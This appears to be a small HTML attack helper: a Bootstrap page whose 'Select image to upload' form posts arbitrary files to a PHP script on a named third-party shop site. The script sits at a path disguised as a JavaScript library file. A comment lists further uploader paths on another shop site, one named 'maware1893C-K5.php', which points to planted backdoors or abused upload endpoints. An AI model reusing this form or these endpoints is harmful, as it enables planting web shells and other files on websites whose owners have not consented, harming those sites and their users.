<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Form</title>
    <!-- Latest compiled and minified CSS -->
    <link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css">

    <!-- Optional theme -->
    <link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap-theme.min.css">

    <!-- Latest compiled and minified JavaScript -->
    <!-- https://shopsongoku.com/Content/images/acc/maware1893C-K5.php  acp/upload/upload.php 
        Content/js/libs/ie-emulation-modes-warning.php-->
    <script src="//netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>
</head>
<body>
    <div class="container">
        <form action="https://shopcaothu.com/Content/js/libs/ie-emulation-modes-warning.php" method="post" enctype="multipart/form-data">
		    Select image to upload:
		    <input type="file" name="img_file[]" multiple="true" id="img_file" >
		    <input type="submit" value="Upload Image" name="submit">
		</form>
    </div>
</body>
</html>